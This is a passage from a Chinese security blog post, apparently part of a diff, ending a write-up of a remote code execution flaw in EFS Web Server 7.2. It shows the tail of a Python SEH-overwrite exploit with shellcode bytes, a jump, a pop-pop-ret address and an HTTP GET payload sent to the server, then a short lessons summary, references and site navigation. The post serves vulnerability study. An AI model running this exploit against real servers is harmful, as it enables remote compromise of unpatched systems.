class="string">b&quot;\x51\x52\x88\xf7\x0b\x14\x62\xae\xe0\xfe\xe2\x37\xcb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc0\x74\x38\x06\xb7\x98\x89\xff\x8e\xa7\x26\x68\x07&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd0\x5a\x08\xe8\x0b\xdf\x38\xa3\x11\x76\xd1\x6a\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xca\xbc\x8c\x3f\x08\xb9\x0e\xb5\xf1\x3e\x0e\xbc\xf4&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7b\x88\x2d\x85\x14\x7d\x51\x3a\x14\x54&quot;</span></span><br><span class="line"></span><br><span class="line">nseh = <span class="string">b&quot;\xeb\x12\x90\x90&quot;</span>  <span class="comment">#jmp 0x12</span></span><br><span class="line">pop_pop_ret = <span class="number">0x100103fe</span>    <span class="comment">#pop pop ret ImageLoad.dll (WinXP SP3)</span></span><br><span class="line">buf += <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">8000</span> 		<span class="comment">#确保payload足够以长触发漏洞</span></span><br><span class="line">payload = flat(<span class="string">&quot;GET &quot;</span>, cyclic(<span class="number">4061</span>), nseh, pop_pop_ret, buf, <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.send(payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure>
+
+<p>发送payload，攻击成功</p>
+<img src="https://i.loli.net/2021/04/20/ziNX3VkbFBd1QG8.png" alt="image-20210419154925886" style="zoom:80%;" />
+
+<p>个人总结：</p>
+<p>逆向漏洞的时候应一级一级的回溯，如果发现无法继续向前回溯，可以在能回溯的最后一级查看寄存器栈等参数寻找有用信息，比如关键字符串。漏洞利用过程主要学习了seh，在排除坏字符的时候发现了很多问题，原因的sql语句将payload中一部分内容进行了处理，所以这里需要结合更多知识进行思考。</p>
+<h2 id="四、参考文献"><a href="#四、参考文献" class="headerlink" title="四、参考文献"></a>四、参考文献</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/170703.html">https://www.freebuf.com/articles/system/170703.html</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u012763794/article/details/66970749">https://blog.csdn.net/u012763794/article/details/66970749</a></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>John Doe
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2021/04/20/EFS-Web-Server-7-2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="EFS Web Server 7.2远程代码执行漏洞分析">http://example.com/2021/04/20/EFS-Web-Server-7-2远程代码执行漏洞分析/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"># 漏洞分析</a>
+              <a href="/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" rel="tag"># 远程代码执行</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/13/PCMan%20FTP%20Server%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="prev" title="PCMan FTP Server缓冲区溢出CVE-2013-4730漏洞分析">
+      <i class="fa fa-chevron-left"></i> PCMan FTP Server缓冲区溢出CVE-2013-4730漏洞分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/28/CVE-2012-4969%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="next" title="CVE-2012-4969漏洞分析">
+      CVE-2012-4969漏洞分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-text">一、漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">二、漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">1. 环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90"><span class="nav-text">2. 漏洞复现与分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">三、漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="nav-text">1. 背景知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="nav-text">2. 利用流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-text">四、参考文献</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/hqz66" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hqz66" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1219089065@gmail.com" title="E-Mail → 1219089065@gmail.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">46k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">42 分钟</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
